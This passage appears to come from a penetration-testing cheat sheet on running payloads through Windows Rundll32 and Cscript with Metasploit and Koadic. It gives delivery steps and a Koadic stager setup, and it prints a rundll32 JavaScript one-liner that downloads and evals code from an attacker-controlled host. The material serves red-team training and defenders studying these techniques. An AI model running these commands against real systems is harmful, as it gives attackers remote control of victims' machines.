#### **Rundll32 - Metasploit**

Rundll32 is a Windows utility that allows the execution of DLL files. Metasploit is a popular framework used for penetration testing and exploiting vulnerabilities. By leveraging the Rundll32 utility in combination with Metasploit, an attacker can execute malicious code on a target system.

To use Rundll32 with Metasploit, follow these steps:

1. Generate a payload using Metasploit's payload generator.
2. Save the payload as a DLL file.
3. Transfer the DLL file to the target system.
4. Use Rundll32 to execute the DLL file on the target system.

The following command can be used to execute the DLL file using Rundll32:

```
rundll32.exe <path_to_dll_file>,<entry_point_function>
```

Replace `<path_to_dll_file>` with the path to the DLL file on the target system, and `<entry_point_function>` with the name of the function to be executed within the DLL.

By exploiting vulnerabilities and using Rundll32 with Metasploit, an attacker can gain unauthorized access to a target system and perform various malicious activities. It is important to note that these techniques should only be used for ethical purposes, such as penetration testing, and with proper authorization.

**Rundll32 - Koadic**

Rundll32 is a Windows utility that allows the execution of DLL files. It can be used by hackers to load malicious DLLs and execute their code. One popular tool that leverages Rundll32 for hacking purposes is Koadic.

Koadic is a post-exploitation RAT (Remote Access Trojan) that provides a command-and-control interface to interact with compromised Windows systems. It uses Rundll32 to load its DLL payload into memory and execute it.

To use Koadic, the attacker first needs to gain access to the target system. This can be achieved through various means, such as exploiting vulnerabilities, social engineering, or brute-forcing credentials. Once inside, the attacker can use Koadic to perform various malicious activities, such as stealing sensitive information, executing commands, or even taking full control of the compromised system.

Koadic provides a wide range of features and functionalities, including the ability to bypass antivirus detection, escalate privileges, and maintain persistence on the compromised system. It also supports multiple communication channels, such as HTTP, DNS, and ICMP, to establish communication with the attacker's command-and-control server.

It is important to note that the use of Rundll32 and Koadic for malicious purposes is illegal and unethical. This information is provided for educational purposes only, to raise awareness about potential security risks and help organizations protect their systems from such attacks.
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();

**Cscript - Metasploit**

Cscript is a command-line scripting engine provided by Microsoft. It is commonly used for running VBScript or JScript scripts on Windows systems. Metasploit, on the other hand, is a popular penetration testing framework that includes various tools and exploits for testing the security of computer systems.

When it comes to using Cscript with Metasploit, there are a few techniques that can be employed. One common approach is to use Cscript to execute a malicious VBScript or JScript payload generated by Metasploit. This payload can be designed to exploit vulnerabilities in the target system and provide the attacker with remote access or control.

To execute a Metasploit payload using Cscript, the following steps can be followed:

1. Generate the payload using Metasploit. This can be done using the `msfvenom` command, specifying the desired payload type, target architecture, and other relevant options.

2. Save the generated payload as a VBScript or JScript file, with a `.vbs` or `.js` extension, respectively.

3. Transfer the payload file to the target system. This can be done using various methods, such as uploading it to a compromised web server, sending it via email, or using other file transfer techniques.

4. On the target system, open a command prompt and navigate to the directory where the payload file is located.

5. Execute the payload using Cscript by running the following command: `cscript payload.vbs` or `cscript payload.js`, depending on the file extension.

6. If successful, the payload will be executed, and the attacker will gain remote access or control over the target system.

It is important to note that using Cscript with Metasploit requires careful planning and consideration of the target system's security measures. Additionally, it is crucial to ensure that the actions performed are legal and within the scope of authorized penetration testing activities.
